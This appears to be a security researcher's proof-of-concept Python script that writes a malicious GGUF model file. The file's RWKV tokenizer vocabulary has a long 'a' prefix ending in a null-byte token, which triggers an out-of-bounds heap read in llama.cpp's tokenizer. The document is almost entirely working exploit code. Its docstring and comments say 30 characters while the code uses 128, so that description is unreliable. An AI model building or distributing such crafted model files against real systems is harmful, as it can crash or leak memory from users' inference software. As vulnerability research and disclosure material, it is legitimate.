#!/usr/bin/env python3
"""
Craft a GGUF that triggers an OOB read in the RWKV tokenizer.

Bug: `llm_tokenizer_rwkv_session::tokenize()` inner loop:
    while (node != NULL) {
        ...
        node = node->traverse(text[++position]);
    }
When `position` reaches `text.size()`, `text[position]` returns '\\0' (null
terminator, valid per C++ standard). If the trie has a '\\0' child at that
node, `traverse('\\0')` returns non-NULL, and `text[++position]` accesses
`text[size+1]` → OOB read past the string allocation.

Attack: a token "aaa...a\\x00" (30 'a's + escaped null) creates a trie path
root → 'a'×30 → '\\0'. Tokenizing input "aaa...a" (30 'a's, heap-allocated)
makes the inner loop traverse 30 'a's, hit '\\0' at position=30, then try
text[31] → OOB.
"""
import sys, os
from pathlib import Path
gguf_path = Path(__file__).resolve().parent.parent / "llama.cpp" / "gguf-py"
sys.path.insert(0, str(gguf_path))
import gguf

V = gguf.GGUFValueType

def main():
    out = sys.argv[1] if len(sys.argv) > 1 else "models/crafted/vocab_rwkv_null_oob.gguf"
    os.makedirs(os.path.dirname(out) or ".", exist_ok=True)

    w = gguf.GGUFWriter(out, arch="llama")

    def kv(key, val, t):
        w.add_key_value(key, val, t)

    # ---- base loader hparams ----
    kv("llama.context_length", 2048, V.UINT32)
    kv("llama.embedding_length", 64, V.UINT32)
    kv("llama.block_count", 1, V.UINT32)
    kv("llama.attention.head_count", 1, V.UINT32)
    kv("llama.attention.head_count_kv", 1, V.UINT32)
    kv("llama.feed_forward_length", 128, V.UINT32)
    kv("llama.attention.layer_norm_rms_epsilon", 1e-5, V.FLOAT32)
    kv("llama.rope.dimension_count", 64, V.UINT32)

    # ---- RWKV tokenizer ----
    kv("tokenizer.ggml.model", "rwkv", V.STRING)

    # Token 0: "a" × 30 + "\\x00" → unescapes to 30 'a's + null byte
    # This creates a trie path: root → 'a'×30 → '\0'
    prefix = "a" * 128
    token_with_null = prefix + "\\x00"

    # Token 1: just "a" (to ensure basic matching works)
    w.add_key_value("tokenizer.ggml.tokens",
        [token_with_null, "a"], V.ARRAY, sub_type=V.STRING)
    w.add_key_value("tokenizer.ggml.scores",
        [0.0, 0.0], V.ARRAY, sub_type=V.FLOAT32)
    w.add_key_value("tokenizer.ggml.token_type",
        [1, 1], V.ARRAY, sub_type=V.INT32)

    kv("tokenizer.ggml.bos_token_id", 0, V.UINT32)
    kv("tokenizer.ggml.eos_token_id", 0, V.UINT32)

    w.write_header_to_file()
    w.write_kv_data_to_file()
    w.write_ti_data_to_file()
    w.close()
    print(f"Written {out} (RWKV tokenizer with null-byte token)")

if __name__ == "__main__":
    main()